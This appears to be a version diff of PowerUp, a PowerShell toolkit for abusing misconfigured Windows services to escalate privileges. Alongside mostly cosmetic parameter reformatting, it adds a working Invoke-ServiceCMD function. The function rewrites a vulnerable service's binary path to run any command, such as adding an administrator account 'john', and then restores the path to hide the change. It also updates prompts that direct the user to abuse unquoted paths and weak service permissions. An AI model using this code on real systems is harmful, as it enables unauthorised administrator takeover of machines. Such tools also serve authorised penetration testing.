@@ -1,6 +1,6 @@
 <#
 
-PowerUp v1.4
+PowerUp v1.5
 
 Various methods to abuse local services to assist
 with escalation on Windows systems.
@@ -177,14 +177,22 @@ function Invoke-ServiceUserAdd {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
+        [string]
+        $ServiceName,
 
-        [string]$UserName = "john",
-        [string]$Password = "Password123!",
-        [string]$GroupName = "Administrators",
-        [Switch]$NoCreate
+        [string]
+        $UserName = "john",
+
+        [string]
+        $Password = "Password123!",
+
+        [string]
+        $GroupName = "Administrators",
+
+        [Switch]
+        $NoCreate
     )
 
     # query WMI for the service
@@ -298,6 +306,119 @@ function Invoke-ServiceUserAdd {
 }
 
 
+function Invoke-ServiceCMD {
+    <#
+    .SYNOPSIS
+    Modifies a target service to execute a specified command.
+    
+    .DESCRIPTION
+    This function stops a service, modifies it to execute a given command, starts
+    the service, stops it, and then restores the original EXE path.
+    
+    .PARAMETER ServiceName
+    The service name to manipulate. Required.
+
+    .PARAMETER CMD
+    The command to execute. Required.
+
+    .EXAMPLE
+    > Invoke-ServiceUserAdd -ServiceName VulnSVC -Command "net user john Password123! /add"
+    Abuses service 'VulnSVC' to add a localuser "john" with password 
+    "Password123! to the machine.
+    #>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $True)]
+        [string]
+        $ServiceName,
+
+        [Parameter(Mandatory = $True)]
+        [string]
+        $CMD
+    )
+
+    # query WMI for the service
+    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'" | ?{$_}
+
+    # make sure we got a result back
+    if ($TargetService){
+        try{
+
+            # try to enable the service it was it was disabled
+            $RestoreDisabled = $false
+            if ($TargetService.StartMode -eq "Disabled"){
+                Write-Verbose "Service '$ServiceName' disabled, enabling..."
+
+                $result = sc.exe config $($TargetService.Name) start= demand
+                if ($result -contains "Access is denied."){
+                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
+                    return $false
+                }
+                $RestoreDisabled = $true
+            }
+
+            # extract the original path and state so we can restore it later
+            $OriginalPath = $TargetService.PathName
+            $OriginalState = $TargetService.State
+            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
+            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
+
+            Write-Verbose "Setting service to execute command '$CMD'"
+            # stop the service
+            $result = sc.exe stop $($TargetService.Name)
+            Start-Sleep -s 1
+
+            # change the path name to the specified command
+            $result = sc.exe config $($TargetService.Name) binPath= $CMD
+
+            # start the service and breath
+            $result = sc.exe start $($TargetService.Name)
+            Start-Sleep -s 1
+
+            Write-Verbose "Restoring original path to service '$ServiceName'"
+            # stop the service
+            $result = sc.exe stop $($TargetService.Name)
+            Start-Sleep -s 1
+
+            # restore the original binary path
+            $result = sc.exe config $($TargetService.Name) binPath= $OriginalPath
+
+            # try to restore the service to whatever state it was
+            if ($RestoreDisabled){
+                Write-Verbose "Re-disabling service '$ServiceName'"
+                $result = sc.exe config $($TargetService.Name) start= disbaled
+            }
+            elseif ($OriginalState -eq "Paused"){
+                Write-Verbose "Starting and then pausing service '$ServiceName'"
+                $result = sc.exe start $($TargetService.Name)
+                Start-Sleep -s .5
+                $result = sc.exe pause $($TargetService.Name)
+            }
+            elseif ($OriginalState -eq "Stopped"){
+                Write-Verbose "Leaving service '$ServiceName' in stopped state"
+            }
+            else{
+                Write-Verbose "Starting service '$ServiceName'"
+                $result = sc.exe start $($TargetService.Name)
+            }
+
+            "Command '$CMD' executed."
+        }
+        catch{
+            Write-Warning "Error while modifying service '$ServiceName': $_"
+            $false
+        }
+    }
+
+    else{
+        Write-Warning "Target service '$ServiceName' not found on the machine"
+        $false
+    }
+}
+
+
+
 function Write-UserAddServiceBinary {
     <#
     .SYNOPSIS
@@ -333,14 +454,22 @@ function Write-UserAddServiceBinary {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
+        [string]
+        $ServiceName,
 
-        [string]$Path = "service.exe",
-        [string]$UserName = "john",
-        [string]$Password = "Password123!",
-        [string]$GroupName = "Administrators"
+        [string]
+        $Path = "service.exe",
+
+        [string]
+        $UserName = "john",
+
+        [string]
+        $Password = "Password123!",
+
+        [string]
+        $GroupName = "Administrators"
     )
 
     # the raw unpatched service binary
@@ -413,14 +542,17 @@ function Write-CMDServiceBinary {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
+        [string]
+        $ServiceName,
 
         [Parameter(Mandatory = $True)]
-        [string]$CMD,
+        [string]
+        $CMD,
 
-        [string]$Path = "service.exe"
+        [string]
+        $Path = "service.exe"
     )
 
     # the raw unpatched service binary
@@ -528,12 +660,19 @@ function Write-ServiceEXE {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
-        [string]$UserName = "john",
-        [string]$Password = "Password123!",
-        [string]$GroupName = "Administrators"
+        [string]
+        $ServiceName,
+
+        [string]
+        $UserName = "john",
+
+        [string]
+        $Password = "Password123!",
+
+        [string]
+        $GroupName = "Administrators"
     )
 
     # query WMI for the service
@@ -589,12 +728,14 @@ function Write-ServiceEXECMD {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
+        [string]
+        $ServiceName,
         
         [Parameter(Mandatory = $True)]
-        [string]$CMD
+        [string]
+        $CMD
     )
 
     # query WMI for the service
@@ -650,10 +791,13 @@ function Restore-ServiceEXE {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName,
-        [string]$BackupPath
+        [string]
+        $ServiceName,
+
+        [string]
+        $BackupPath
     )
 
     # query WMI for the service
@@ -708,9 +852,10 @@ function Invoke-ServiceStart {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName
+        [string]
+        $ServiceName
     )
 
     # query WMI for the service
@@ -773,9 +918,10 @@ function Invoke-ServiceStop {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName
+        [string]
+        $ServiceName
     )
 
     # query WMI for the service
@@ -831,9 +977,10 @@ function Invoke-ServiceEnable {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName
+        [string]
+        $ServiceName
     )
 
     # query WMI for the service
@@ -888,9 +1035,10 @@ function Invoke-ServiceDisable {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)]
-        [string]$ServiceName
+        [string]
+        $ServiceName
     )
 
     # query WMI for the service
@@ -946,9 +1094,10 @@ function Get-ServiceDetails {
     #>
 
     [CmdletBinding()]
-    Param (
+    Param(
         [Parameter(Mandatory = $True)] 
-        [string]$ServiceName
+        [string]
+        $ServiceName
     )
 
     # query WMI for the service
@@ -1009,7 +1158,7 @@ function Invoke-FindDLLHijack {
     #>
 
     [CmdletBinding()]
-    param(
+    Param(
         [Switch]
         $ExcludeWindows,
 
@@ -1104,7 +1253,8 @@ function Invoke-FindPathHijack {
     http://www.greyhathacker.net/?p=738
     #>
 
-    [CmdletBinding()] param()
+    [CmdletBinding()]
+    Param()
 
     $ErrorActionPreference = "SilentlyContinue"
 
@@ -1170,7 +1320,8 @@ function Get-RegAlwaysInstallElevated {
     Checks if the AlwaysInstallElevated registry key is set.
     #>
 
-    [CmdletBinding()] param()
+    [CmdletBinding()]
+    Param()
     
     $ErrorActionPreference = "SilentlyContinue"
 
@@ -1223,7 +1374,8 @@ function Get-RegAutoLogon {
     https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
     #>
 
-    [CmdletBinding()] param()
+    [CmdletBinding()]
+    Param()
 
     $AutoAdminLogon = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
 
@@ -1281,10 +1433,10 @@ function Get-UnattendedInstallFiles {
     
     $ErrorActionPreference = "SilentlyContinue"
 
-    $SearchLocations = @( "c:\sysprep\sysprep.xml",
-                        "c:\sysprep.inf",
-                        (join-path $env:windir "\Panther\Unattended.xml"),
-                        (join-path $env:windir "\Panther\Unattend\Unattended.xml"))
+    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
+                            "c:\sysprep.inf",
+                            (join-path $env:windir "\Panther\Unattended.xml"),
+                            (join-path $env:windir "\Panther\Unattend\Unattended.xml") )
 
     # test the existence of each path and return anything found
     $SearchLocations | where { Test-Path $_ }
@@ -1652,7 +1804,7 @@ function Get-NetGroup {
     #>
 
     [CmdletBinding()]
-    param(
+    Param(
         [string]
         $GroupName = 'Domain Admins',
 
@@ -1664,7 +1816,7 @@ function Get-NetGroup {
     function Get-NetDomainControllers {
 
         [CmdletBinding()]
-        param(
+        Param(
             [string]
             $Domain
         )
@@ -1770,7 +1922,7 @@ function Invoke-CheckLocalAdmin {
     #>
 
     [CmdletBinding()]
-    param()
+    Param()
 
     $IsLocalAdmin = $false
 
@@ -1893,7 +2045,7 @@ function Invoke-AllChecks {
     "`n`n[*] Checking for unquoted service paths..."
     $UnquotedServices = Get-ServiceUnquoted
     if ($UnquotedServices){
-        "[*] Use 'Write-UserAddServiceBinary' to abuse`n"
+        "[*] Use 'Write-UserAddServiceBinary' or 'Write-CMDServiceBinary' to abuse`n"
         foreach ($Service in $UnquotedServices){
             "[+] Unquoted service path: $($Service.ServiceName) - $($Service.Path)"
         }
@@ -1902,7 +2054,7 @@ function Invoke-AllChecks {
     "`n`n[*] Checking service executable permissions..."
     $ServiceEXEs = Get-ServiceEXEPerms
     if ($ServiceEXEs){
-        "[*] Use 'Write-ServiceEXE -ServiceName SVC' to abuse`n"
+        "[*] Use 'Write-ServiceEXE -ServiceName SVC' or 'Write-ServiceEXECMD' to abuse`n"
         foreach ($ServiceEXE in $ServiceEXEs){
             "[+] Vulnerable service executable: $($ServiceEXE.ServiceName) - $($ServiceEXE.Path)"
         }
@@ -1911,7 +2063,7 @@ function Invoke-AllChecks {
     "`n`n[*] Checking service permissions..."
     $VulnServices = Get-ServicePerms
     if ($VulnServices){
-        "[*] Use 'Invoke-ServiceUserAdd' to abuse`n"
+        "[*] Use 'Invoke-ServiceUserAdd -ServiceName SVC' or 'Invoke-ServiceCMD' to abuse`n"
         foreach ($Service in $VulnServices){
             "[+] Vulnerable service: $($Service.ServiceName) - $($Service.Path)"
         }
